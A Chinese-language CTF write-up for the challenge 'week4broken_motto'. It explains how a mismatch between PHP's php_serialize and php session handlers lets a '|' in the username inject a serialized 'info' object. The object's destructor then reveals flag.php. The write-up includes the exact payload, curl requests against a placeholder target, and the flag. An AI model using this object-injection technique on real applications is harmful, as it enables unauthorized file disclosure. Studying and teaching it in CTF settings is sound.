# week4broken_motto

## 题目简述

题目在注册页和个人资料页使用了不同的 PHP Session 序列化处理器。注册页用 `php_serialize` 保存整个 `$_SESSION` 数组，个人资料页却用默认的 `php` 处理器读取；攻击者可以在用户名中插入 `|`，让后一种处理器把后续内容解释成独立的序列化对象，最终触发 `info::__destruct()` 读取 flag。

## 解题过程

`register.php` 在 `session_start()` 前显式设置：

```php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
```

该处理器会把整个 Session 保存成一个序列化数组，例如：

```text
a:3:{s:8:"username";s:...:"...";s:8:"password";...}
```

`profile.php` 中相同配置却被注释：

```php
// ini_set('session.serialize_handler', 'php_serialize');
session_start();
```

默认 `php` 处理器使用 `键名|序列化值` 格式。若用户名以 `|` 加序列化对象开头，读取 Session 时，前面的数组文本会被当成一个无意义键名，而 `|` 后的对象会被成功反序列化。

可利用的类定义如下：

```php
class info {
    public $admin;
    public $username;
    public $motto;

    public function __destruct() {
        echo 'your motto:'.$this->motto;
        if ($this->admin === 1) {
            show_source('flag.php');
        }
    }
}
```

因此需要让 `admin` 成为整数 `1`，而不是字符串。注册时将用户名设置为：

```text
|O:4:"info":3:{s:5:"admin";i:1;s:8:"username";N;s:5:"motto";N;}
```

密码和格言可任意填写。以下请求展示了完整流程，其中 Cookie 必须在两次请求之间保持一致：

```text
curl -s -c cookies.txt -X POST "http://<TARGET>/register.php" \
  --data-urlencode 'username=|O:4:"info":3:{s:5:"admin";i:1;s:8:"username";N;s:5:"motto";N;}' \
  --data-urlencode 'password=x' \
  --data-urlencode 'motto=x'

curl -s -b cookies.txt "http://<TARGET>/profile.php"
```

解析错位后，`$_SESSION['username']` 通常不存在，因此 `profile.php` 会执行 `die()`；这不影响利用，因为请求结束时仍会析构已经反序列化的 `info` 对象，其 `admin === 1` 条件成立并调用 `show_source('flag.php')`。仓库源码中的结果为：

```text
0xGame{session_un5eria1ize}
```

## 方法总结

漏洞根因不是普通的“Session 可控”，而是同一份 Session 数据先由 `php_serialize` 写入、再由 `php` 按竖线分隔格式读取。利用时要同时满足三点：在可控字符串中制造 `|` 解析边界、注入已有类 `info` 的对象、将 `admin` 构造为严格比较所需的整数 `1`。即使业务代码提前 `die()`，请求结束阶段的析构函数仍会执行。
